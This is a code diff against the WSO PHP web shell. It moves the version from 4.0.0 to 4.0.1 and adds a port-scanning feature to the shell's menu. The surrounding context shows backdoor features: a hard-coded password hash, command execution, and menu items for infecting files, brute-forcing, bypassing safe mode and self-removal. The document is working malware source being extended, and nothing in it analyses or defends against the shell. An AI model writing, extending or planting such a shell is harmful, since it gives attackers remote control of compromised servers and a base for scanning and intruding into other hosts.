@@ -1,5 +1,5 @@
 <?php
-/* WSO 4.0.0 (Web Shell by HARD _LINUX) */
+/* WSO 4.0.1 (Web Shell by HARD _LINUX) */
 $auth_pass = "21232f297a57a5a743894a0e4a801fc3"; //admin
 $color = "#fff";
 $default_action = 'FilesMan';
@@ -15,7 +15,7 @@ if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) {
 @ini_set('max_execution_time',0);
 @set_time_limit(0);
 @set_magic_quotes_runtime(0);
-@define('VERSION', '4.0.0');
+@define('VERSION', '4.0.1');
 if( get_magic_quotes_gpc() ) {
 	function stripslashes_array($array) {
 		return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array);
@@ -240,14 +240,14 @@ function printHeader() {
 	$opt_charsets = '';
 	foreach($charsets as $item)
 		$opt_charsets .= '<option value="'.$item.'" '.($_POST['charset']==$item?'selected':'').'>'.$item.'</option>';
-	$m = array('Sec. Info'=>'SecInfo','Files'=>'FilesMan','Console'=>'Console','Infect'=>'Infect','Sql'=>'Sql','Php'=>'Php','Safe mode'=>'SafeMode','String tools'=>'StringTools','Bruteforce'=>'Bruteforce','Network'=>'Network','Domains'=>'Domains');
+	$m = array('Sec. Info'=>'SecInfo','Files'=>'FilesMan','Console'=>'Console','Infect'=>'Infect','Sql'=>'Sql','Php'=>'Php','Safe mode'=>'SafeMode','String tools'=>'StringTools','Port Scanner'=>'PortScanner','Bruteforce'=>'Bruteforce','Network'=>'Network','Domains'=>'Domains');
 	
 	if(!empty($GLOBALS['auth_pass']))
 	$m['Logout'] = 'Logout';
 	$m['Self remove'] = 'SelfRemove';
 	$menu = '';
 	foreach($m as $k => $v)
-		$menu .= '<th width="'.(int)(100/count($m)).'%">[ <a href="#" onclick="g(\''.$v.'\',null,\'\',\'\',\'\')">'.$k.'</a> ]</th>';
+		$menu .= '<th>[ <a href="#" onclick="g(\''.$v.'\',null,\'\',\'\',\'\')">'.$k.'</a> ]</th>';
 	$drives = "";
 	if ($GLOBALS['os'] == 'win') {
 		foreach( range('a','z') as $drive )
@@ -310,8 +310,8 @@ function ex($in) {
 		while(!@feof($f))
 			$out .= fread($f,1024);
 		pclose($f);
-	}else return 'Unable to execute command';
-	return ($out==''?'Query did not return anything':$out);
+	}else return '↳ Unable to execute command';
+	return ($out==''?'↳ Query did not return anything':$out);
 }
 function viewSize($s) {
 	if($s >= 1073741824)
@@ -1488,6 +1488,36 @@ function actionNetwork() {
 	}
 	echo '</div>';
 	printFooter();
+}
+function actionPortScanner() {
+    printHeader();
+    echo '<h1>Port Scanner</h1>';
+    echo '<div class="content">';
+    echo '<form action="" method="post">';
+    
+    if(isset($_POST['host']) && is_numeric($_POST['end']) && is_numeric($_POST['start'])){
+        $start = strip_tags($_POST['start']);
+        $end = strip_tags($_POST['end']);
+        $host = strip_tags($_POST['host']);
+        for($i = $start; $i<=$end; $i++){
+            $fp = @fsockopen($host, $i, $errno, $errstr, 3);
+            if($fp){
+                echo 'Port '.$i.' is <font color=lime>open</font><br>';
+            }
+            flush();
+        }
+    } else {
+        echo '<br /><br /><center><input type="hidden" name="a" value="PortScanner"><input type="hidden" name=p1><input type="hidden" name="p2">
+              <input type="hidden" name="c" value="'.htmlspecialchars($GLOBALS['cwd']).'">
+              <input type="hidden" name="charset" value="'.(isset($_POST['charset'])?$_POST['charset']:'').'">
+              Host: <input type="text" name="host" value="localhost"/><br /><br />
+              Port start: <input type="text" name="start" value="0"/><br /><br />
+              Port end:<input type="text" name="end" value="5000"/><br /><br />
+              <input type="submit" value="Scan Ports" />
+              </form></center><br /><br />';
+    }
+    echo '</div>';
+    printFooter();    
 }
 if( empty($_POST['a']) )
 	if(isset($default_action) && function_exists('action' . $default_action))
